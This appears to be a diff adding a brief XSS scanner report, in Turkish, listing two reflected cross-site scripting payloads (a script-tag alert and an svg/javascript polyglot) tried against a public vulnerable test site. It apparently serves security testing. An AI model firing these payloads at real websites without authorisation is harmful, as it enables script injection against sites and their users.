@@ -1,0 +1,5 @@
+XSS Test Report
+========================================
+
+Potansiyel XSS Tespit Edildi! - URL: http://testphp.vulnweb.com/listproducts.php?cat=1?param="><script>alert(1)</script> - Payload: "><script>alert(1)</script>
+Potansiyel XSS Tespit Edildi! - URL: http://testphp.vulnweb.com/listproducts.php?cat=1?param="'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p> - Payload: "'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
